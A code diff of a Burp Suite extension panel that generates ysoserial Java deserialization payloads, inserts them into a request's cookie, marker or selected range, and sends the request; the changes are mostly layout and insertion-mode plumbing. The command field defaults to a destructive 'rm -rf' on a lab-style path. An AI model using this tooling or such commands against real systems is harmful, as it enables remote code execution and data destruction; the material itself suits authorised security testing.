@@ -10,7 +10,6 @@ import burp.core.Encoder;
 import burp.core.GadgetCatalog;
 import burp.core.Settings;
 import burp.core.YsoserialEngine;
-import burp.model.Gadget;
 import burp.model.HostIntel;
 
 import javax.swing.*;
@@ -41,9 +40,14 @@ public final class PayloadBuilderPanel extends JPanel {
 
     private final JComboBox<String> gadgetCombo = new JComboBox<>();
     private final JComboBox<Encoder> encodingCombo = new JComboBox<>(Encoder.values());
+    private static final String INS_SELECTION = "Selection / caret";
+    private static final String INS_MARKER = "{PAYLOAD} marker";
+    private static final String INS_COOKIE = "Cookie (auto)";
+    private final JComboBox<String> insertModeCombo =
+            new JComboBox<>(new String[]{INS_SELECTION, INS_MARKER, INS_COOKIE});
+    private final JTextField cookieNameField = new JTextField("session", 8);
     private final JTextField commandField = new JTextField("rm -rf /home/carlos/test.txt");
-    private final JTextField cookieNameField = new JTextField("session", 14);
-    private final JTextArea payloadPreview = new JTextArea(4, 40);
+    private final JTextArea payloadPreview = new JTextArea(3, 40);
     private final JLabel recommendation = new JLabel(" ");
     private final JLabel statusLabel = new JLabel(" ");
 
@@ -85,32 +89,27 @@ public final class PayloadBuilderPanel extends JPanel {
         p.add(commandField, c);
         c.gridwidth = 1;
 
-        // Row: gadget + encoding
+        // Row: gadget | encoding | insert-mode | cookie  (compact, in parallel)
         row++;
         c.gridx = 0; c.gridy = row; c.weightx = 0;
-        p.add(new JLabel("Gadget (Common):"), c);
+        p.add(new JLabel("Gadget:"), c);
         c.gridx = 1; c.weightx = 1;
         p.add(gadgetCombo, c);
         c.gridx = 2; c.weightx = 0;
         p.add(new JLabel("Encoding:"), c);
-        c.gridx = 3; c.weightx = 1;
+        c.gridx = 3; c.weightx = 0;
         p.add(encodingCombo, c);
+        c.gridx = 4; c.weightx = 0;
+        p.add(new JLabel("Insert into:"), c);
+        c.gridx = 5; c.weightx = 0;
+        p.add(insertModeCombo, c);
+        c.gridx = 6; c.weightx = 0;
+        p.add(cookieNameField, c);   // only used in Cookie mode
 
-        // Row: cookie name + recommendation
+        // Row: buttons + recommendation
         row++;
-        c.gridx = 0; c.gridy = row; c.weightx = 0;
-        p.add(new JLabel("Target cookie:"), c);
-        c.gridx = 1; c.weightx = 0;
-        p.add(cookieNameField, c);
-        c.gridx = 2; c.gridwidth = 2; c.weightx = 1;
-        recommendation.setForeground(new Color(0x1a7f37));
-        p.add(recommendation, c);
-        c.gridwidth = 1;
-
-        // Row: buttons
-        row++;
-        JButton generate = new JButton("Generate payload");
-        JButton insert   = new JButton("Insert into cookie");
+        JButton generate = new JButton("Generate");
+        JButton insert   = new JButton("Insert");
         JButton send     = new JButton("Send");
         JButton genInsertSend = new JButton("Generate + Insert + Send");
         JButton reload   = new JButton("Reload ysoserial");
@@ -121,31 +120,39 @@ public final class PayloadBuilderPanel extends JPanel {
         genInsertSend.addActionListener(e -> onOneShot());
         reload.addActionListener(e -> { yso.reload(); refreshGadgets(); });
         gadgetCombo.addActionListener(e -> updateRecommendationLabel());
+        insertModeCombo.addActionListener(e ->
+                cookieNameField.setVisible(INS_COOKIE.equals(insertModeCombo.getSelectedItem())));
+        cookieNameField.setVisible(false);
 
         JPanel buttons = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 0));
         buttons.add(generate); buttons.add(insert); buttons.add(send);
         buttons.add(genInsertSend); buttons.add(reload);
-        c.gridx = 0; c.gridy = row; c.gridwidth = 4; c.weightx = 1;
+        c.gridx = 0; c.gridy = row; c.gridwidth = 5; c.weightx = 0;
         p.add(buttons, c);
-
-        // Row: payload preview
-        row++;
-        payloadPreview.setEditable(false);
-        payloadPreview.setLineWrap(true);
-        payloadPreview.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 11));
-        JScrollPane sp = new JScrollPane(payloadPreview);
-        sp.setBorder(BorderFactory.createTitledBorder("Encoded payload preview"));
-        c.gridx = 0; c.gridy = row; c.gridwidth = 4; c.weightx = 1; c.fill = GridBagConstraints.BOTH;
-        p.add(sp, c);
+        c.gridx = 5; c.gridwidth = 2; c.weightx = 1;
+        recommendation.setForeground(new Color(0x1a7f37));
+        p.add(recommendation, c);
+        c.gridwidth = 1;
 
         return p;
     }
 
     private JComponent buildEditors() {
-        JSplitPane split = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT,
+        payloadPreview.setEditable(false);
+        payloadPreview.setLineWrap(true);
+        payloadPreview.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 11));
+        JScrollPane preview = new JScrollPane(payloadPreview);
+        preview.setBorder(BorderFactory.createTitledBorder(
+                "Encoded payload preview  —  or type " + RequestInserter.MARKER
+                + " / select bytes in the request to mark the insertion point"));
+
+        JSplitPane editors = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT,
                 titled(requestEditor.uiComponent(), "Request (editable — paste or send from Proxy/Repeater)"),
                 titled(responseEditor.uiComponent(), "Response"));
-        split.setResizeWeight(0.5);
+        editors.setResizeWeight(0.5);
+
+        JSplitPane split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, preview, editors);
+        split.setResizeWeight(0.18);   // small preview, large editors
         return split;
     }
 
@@ -184,15 +191,44 @@ public final class PayloadBuilderPanel extends JPanel {
         }
     }
 
-    private void onInsert(String encoded) {
-        if (encoded == null) return;
+    private boolean onInsert(String encoded) {
+        if (encoded == null) return false;
         HttpRequest req = requestEditor.getRequest();
-        if (req == null) { status("No request loaded.", true); return; }
-        String cookie = cookieNameField.getText().trim();
-        if (cookie.isEmpty()) { status("Set a target cookie name first.", true); return; }
-        HttpRequest updated = CookieRewriter.setCookie(req, cookie, encoded);
+        if (req == null) { status("No request loaded.", true); return false; }
+
+        // Guard: a payload with CR/LF/NUL would break headers or truncate the request.
+        if (!RequestInserter.isTransportSafe(encoded)) {
+            status("Payload has raw line breaks/NUL — switch to a URL-safe encoding "
+                    + "(Base64 / Base64 URL) before inserting into the request.", true);
+            return false;
+        }
+
+        String mode = (String) insertModeCombo.getSelectedItem();
+        HttpRequest updated;
+        String where;
+        if (INS_MARKER.equals(mode)) {
+            updated = RequestInserter.replaceMarker(req, encoded);
+            if (updated == null) { status("No " + RequestInserter.MARKER + " marker in the request.", true); return false; }
+            where = RequestInserter.MARKER + " marker";
+        } else if (INS_COOKIE.equals(mode)) {
+            String cookie = cookieNameField.getText().trim();
+            if (cookie.isEmpty()) { status("Enter a cookie name for Cookie mode.", true); return false; }
+            updated = CookieRewriter.setCookie(req, cookie, encoded);
+            where = "cookie '" + cookie + "'";
+        } else { // Selection / caret
+            var sel = requestEditor.selection();
+            if (sel.isPresent()) {
+                var r = sel.get().offsets();
+                updated = RequestInserter.replaceRange(req, r.startIndexInclusive(), r.endIndexExclusive(), encoded);
+                where = "selected range";
+            } else {
+                updated = RequestInserter.insertAt(req, requestEditor.caretPosition(), encoded);
+                where = "caret position";
+            }
+        }
         requestEditor.setRequest(updated);
-        status("Inserted payload into cookie '" + cookie + "'.", false);
+        status("Inserted payload at " + where + ".", false);
+        return true;
     }
 
     private void onSend() {
@@ -222,8 +258,7 @@ public final class PayloadBuilderPanel extends JPanel {
         String enc = currentEncodedPayload();
         if (enc == null) return;
         payloadPreview.setText(enc);
-        onInsert(enc);
-        onSend();
+        if (onInsert(enc)) onSend();   // only send if the payload was actually placed
     }
 
     // ------------------------------------------------------------------ helpers
@@ -268,14 +303,10 @@ public final class PayloadBuilderPanel extends JPanel {
         String host = hostOf();
         String g = selectedGadget();
         if (g == null) { recommendation.setText(" "); return; }
-        Gadget meta = GadgetCatalog.metadata(g);
-        int score = HostIntel.get().scoreFor(host, meta);
-        StringBuilder sb = new StringBuilder("<html>");
-        if (score >= 100) sb.append("<b>★ Confirmed on this host.</b> ");
-        else if (score >= 10) sb.append("<b>Recommended:</b> fingerprint match. ");
-        sb.append("Needs: <i>").append(esc(meta.requiredLibrary())).append("</i>. ").append(esc(meta.notes()));
-        sb.append("</html>");
-        recommendation.setText(sb.toString());
+        int score = HostIntel.get().scoreFor(host, GadgetCatalog.metadata(g));
+        if (score >= 100)      recommendation.setText("★ Confirmed on this host");
+        else if (score >= 10)  recommendation.setText("★ Recommended (fingerprint match)");
+        else                   recommendation.setText(" ");
     }
 
     private String selectedGadget() {
@@ -313,9 +344,5 @@ public final class PayloadBuilderPanel extends JPanel {
             statusLabel.setForeground(error ? Color.RED.darker() : new Color(0x1a7f37));
             statusLabel.setText(" " + msg);
         });
-    }
-
-    private static String esc(String s) {
-        return s == null ? "" : s.replace("<", "&lt;").replace(">", "&gt;");
     }
 }
